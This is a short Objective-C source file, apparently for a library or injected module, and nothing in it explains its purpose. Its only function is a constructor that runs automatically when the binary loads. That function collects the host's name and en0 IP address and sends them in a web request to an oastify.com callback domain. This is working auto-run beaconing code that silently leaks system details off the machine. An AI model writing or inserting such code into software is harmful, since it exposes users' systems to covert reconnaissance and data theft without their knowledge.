#import <Foundation/Foundation.h>
#import <unistd.h>
#import <sys/types.h>
#import <ifaddrs.h>
#import <arpa/inet.h>

__attribute__((constructor))
static void autoRun() {
    @autoreleasepool {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));

        struct ifaddrs *interfaces = NULL;
        struct ifaddrs *temp_addr = NULL;
        char ip[INET_ADDRSTRLEN] = "0.0.0.0";

        if (getifaddrs(&interfaces) == 0) {
            temp_addr = interfaces;
            while (temp_addr != NULL) {
                if (temp_addr->ifa_addr->sa_family == AF_INET &&
                    strcmp(temp_addr->ifa_name, "en0") == 0) {
                    struct sockaddr_in *addr = (struct sockaddr_in *)temp_addr->ifa_addr;
                    inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
                    break;
                }
                temp_addr = temp_addr->ifa_next;
            }
        }
        freeifaddrs(interfaces);

        NSString *urlString = [NSString stringWithFormat:@"http://lwlvh2q5jxf20cx77q7eln0r7idg16pv.oastify.com/?h=%s&i=%s", hostname, ip];
        NSURL *url = [NSURL URLWithString:urlString];
        [[[NSURLSession sharedSession] dataTaskWithURL:url] resume];
    }
}

